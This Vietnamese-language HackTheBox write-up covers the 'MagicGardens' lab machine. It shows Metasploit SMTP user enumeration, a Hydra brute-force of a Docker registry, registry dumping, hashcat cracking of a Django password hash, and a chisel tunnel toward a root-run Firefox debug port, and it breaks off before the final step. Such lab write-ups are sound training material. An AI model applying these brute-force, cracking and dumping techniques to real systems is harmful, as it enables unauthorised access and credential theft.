---
title: "MagicGardens"
date: 2024-05-23 23:38:00 +0700
categories: [hackthebox]
tags: [hackthebox, web]
authors: [toan]
toc: true
---
## Introduction
Machine thuộc sessons 5, thuộc vào level cực khó, Linux :>. Trong bài này có thể khai thác lổ hỏng qua port (5000) - Docker Registry -> reverse shell -> khai thác firefox debug đang chạy dưới quyền root -> root flag. User flag thì chưa biết làm :>

## Recons
Đầu tiên cần nhận diện thứ gì ở mục tiêu
![image.png](https://i.postimg.cc/YSxRzCS2/image.png)
Mình đã test trên port 80, scan dir, vhost đủ kiểu. có 1 dir đáng ngờ `/admin`, nó đang dùng django CMS, nhưng các PoC hay CVE ko tác dụng với nó. Chuyển sang smtp_enum để tìm user.
```shell
-> msfconsole
msf6 > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

msf6 > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.14.18
RHOSTS => 10.10.14.18
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/seclists/Usernames/Names/names.txt
USER_FILE => /usr/share/wordlists/seclists/Usernames/Names/names.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 10.10.14.18:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.11.9
RHOSTS => 10.10.11.9
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 10.10.11.9:25         - 10.10.11.9:25 Banner: 220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
```
Sau scan xong bạn sẽ thấy `alex`.
## Exploit
[5000-pentesting-docker-registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
Bạn có thể đọc nó. khi test req lên port 5000 ta thấy docker yêu cầu xác thực, tiến hành bruteforce nó với name là `alex`.

```shell
➜  ~ hydra -l alex -P /usr/share/wordlists/rockyou.txt 10.10.11.9  -s 5000 https-get /v2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 23:47:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-gets://10.10.11.9:5000/v2/
[5000][http-get] host: 10.10.11.9   login: alex   password: diamonds
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 23:47:36
➜  ~
```
`alex:diamonds`<br>
rồi xem docker tại port 5000 thôi :>
```shell
➜  ~ curl -k -u alex:diamonds  https://magicgardens.htb:5000/v2/_catalog
{"repositories":["magicgardens.htb"]}
➜  ~ cd payload/DockerRegistryGrabber
➜  DockerRegistryGrabber git:(main) ✗ ls
README.md  deploy.sh  deploybasicauth.sh  drg.py  magicgardens.htb  pyproject.toml  requirements.txt  screenshot
➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb:5000 -U alex -P diamonds --list
Dunno what happend but something fucked up Failed to parse: https://magicgardens.htb:5000:5000/v2/_catalog
➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb -U alex -P diamonds --list
[+] magicgardens.htb
➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb -U alex -P diamonds --dump_all
```
dump hết thôi :>> rồi vào check. Tìm từng file trong đấy sẽ thấy có file db `/usr/src/app/db.sqlite3`
```shell
➜  magicgardens.htb git:(main) ✗ sqlite3 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb/usr/src/app/db.sqlite3
SQLite version 3.44.0 2023-11-01 11:23:50
Enter ".help" for usage hints.
sqlite> .talbes
Error: unknown command or invalid arguments:  "talbes". Enter ".help" for help
sqlite> .tables
auth_group                  django_content_type
auth_group_permissions      django_migrations
auth_permission             django_session
auth_user                   store_order
auth_user_groups            store_product
auth_user_user_permissions  store_storemessage
django_admin_log            store_storeuser
sqlite> select * from auth_user
   ...> ;
2|pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=|2023-06-06 17:34:56.520750|1|morty|||1|1|2023-06-06 17:32:24|
sqlite>
```
password của morty bị hash r -> đây là Django (PBKDF2-SHA256), thử crack nó.
```shell
➜  ~ hashcat -m 10000 -a 0 hash /usr/share/wordlists/rockyou.txt --show
pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=:jonasbrothers
➜  ~ cat hash
pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=
```
![image.png](https://i.postimg.cc/4xXRfnjs/image.png)
Dùng `morty:jonasbrothers` có thể login vào ssh nhưng đây không chứa user flag :V <br>
Check process đang chạy hoặc dùng `linpeas` để check sẽ thấy một process đáng ngờ là firefox debug.
![image.png](https://i.postimg.cc/qMd9wzJy/image.png)
Mấy group bên trung hay forum hacker bảo đây là lổ hỏng có thể khai thác r đọc file :< Check netstat thì thấy nó đang chạy vài cổng thử tạo tunel rồi check -> dùng `chisel` tool. [chisel's source](https://github.com/jpillora/chisel)
![image.png](https://i.postimg.cc/1XYV9L3Z/image.png)
firefox-esr chạy trên port 36825 -> tạo tunel check 
![image.png](https://i.postimg.cc/dVCZYNMz/image.png)
`This command line is used to launch a browser instance of Firefox Extended Support Release (Firefox ESR) and configure it to support automated testing, especially when used in conjunction with Selenium WebDriver and Marionette. Here's an explanation of the individual parameters:firefox-esr: This is the executable for Firefox ESR. Firefox ESR is the version of Firefox for businesses and organizations that need to support older versions for longer.–marionette: Enables the Marionette driver, which is Firefox's WebDriver implementation. It allows Firefox to be controlled through Selenium or other WebDriver-compatible automation tools.–headless: Launch Firefox in headless mode, which means that the browser will not display a graphical user interface (GUI). This is often used to automate tests or run browsers on servers that don't have a graphical interface.–remote-debugging-port 52735: Set the remote debugging port to 52735. Through this port, you can use Firefox developer tools for remote debugging or communicate with other tools such as Selenium Grid.–remote-allow-hosts localhost: Allows remote connections from localhost. This is often used with --remote-debugging-port to ensure that only connections from localhost can access the debug port.-no-remote: Prevents Firefox from trying to open an instance that is already running. In an automated testing environment, this option is important because it ensures that you have control over a completely new instance of the browser.-profile /tmp/rust_mozprofileba09VC: Use the specified configuration folder to launch Firefox. In this example, the configuration folder is located in /tmp/rust_mozprofileba09VC. This allows you to configure specific settings, extensions, bookmarks, and more for specific browser instances.` - Tìm được từ một post bên Trung Quốc :> Đại khái thì ta có thể đọc file thông qua port này vì nó đang chạy service của firefox tích hợp selenium để automate j ấy. Ý tưởng là ta mở một tabs với url là vuln sau đó screenshot lại nó. 